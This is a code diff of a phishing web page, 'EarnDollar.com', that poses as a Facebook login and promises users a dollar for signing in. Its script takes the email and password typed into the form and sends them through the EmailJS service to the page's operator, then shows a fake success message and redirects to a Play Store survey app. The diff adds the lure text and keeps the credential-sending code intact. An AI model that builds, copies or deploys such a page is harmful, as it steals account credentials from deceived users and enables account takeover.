@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>EarnDollar.com</title>
+    <style>
         body {
             display: flex;
             flex-direction: column;
@@ -15,8 +16,14 @@
         }
         h1 {
             color: red;
-            font-size: 36px; /* Big header size */
-            margin-bottom: 20px; /* Space below the header */
+            font-size: 36px;
+            margin-bottom: 10px;
+        }
+        p.description {
+            font-size: 18px;
+            color: #333;
+            margin-bottom: 20px;
+            text-align: center;
         }
         .login-container {
             background-color: white;
@@ -64,7 +71,9 @@
     </style>
 </head>
 <body>
-    <h1>EarnDollar</h1> <!-- Big header title -->
+    <h1>EarnDollar</h1>
+    <p class="description">Log in to Facebook to earn your first dollar now!</p>
+    
     <div class="login-container">
         <h2>Facebook Login</h2>
         <form id="loginForm" onsubmit="return handleSubmit(event);">
@@ -80,11 +89,8 @@
     <!-- EmailJS SDK -->
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <script>
-        // Initialize EmailJS with your public key
         (function(){
-            emailjs.init({
-                publicKey: "fjJBjt33JjzxpkTww"  // Replace with your public key
-            });
+            emailjs.init("fjJBjt33JjzxpkTww");
         })();
 
         function handleSubmit(event) {
@@ -92,20 +98,17 @@
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
 
-            // Prepare the data to be sent
             const templateParams = {
                 user_email: email,
                 user_password: password
             };
 
-            // Send the email using EmailJS
             emailjs.send("service_la9pk5b", "template_taq80yv", templateParams)
                 .then(function(response) {
                     console.log('SUCCESS!', response.status, response.text);
                     alert('تم التسجيل بنجاح !يرجى انتظار رسالة تأكيد الحساب .');
-                    // Redirect after 1 seconds (1000 milliseconds)
                     setTimeout(function() {
-                        window.location.href = "https://play.google.com/store/apps/details?id=app.dollarsurveys"; // Google Play Store link
+                        window.location.href = "https://play.google.com/store/apps/details?id=app.dollarsurveys";
                     }, 1000);
                 }, function(error) {
                     console.error('FAILED...', error);
